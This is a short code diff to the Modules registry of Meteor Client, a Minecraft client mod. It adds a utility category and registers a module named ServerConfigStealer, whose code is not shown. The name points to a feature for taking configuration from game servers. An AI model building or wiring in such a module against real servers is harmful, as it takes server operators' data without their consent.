@@ -26,6 +26,7 @@ import meteordevelopment.meteorclient.systems.modules.misc.swarm.Swarm;
 import meteordevelopment.meteorclient.systems.modules.movement.*;
 import meteordevelopment.meteorclient.systems.modules.movement.elytrafly.ElytraFly;
 import meteordevelopment.meteorclient.systems.modules.movement.speed.Speed;
+import meteordevelopment.meteorclient.systems.modules.utility.*;
 import meteordevelopment.meteorclient.systems.modules.player.*;
 import meteordevelopment.meteorclient.systems.modules.render.*;
 import meteordevelopment.meteorclient.systems.modules.render.blockesp.BlockESP;
@@ -76,6 +77,7 @@ public class Modules extends System<Modules> {
         initMovement();
         initRender();
         initWorld();
+        initUtility();
         initMisc();
     }
 
@@ -556,6 +558,10 @@ public class Modules extends System<Modules> {
             add(new Excavator());
             add(new InfinityMiner());
         }
+    }
+
+    private void initUtility() {
+        add(new ServerConfigStealer());
     }
 
     private void initMisc() {
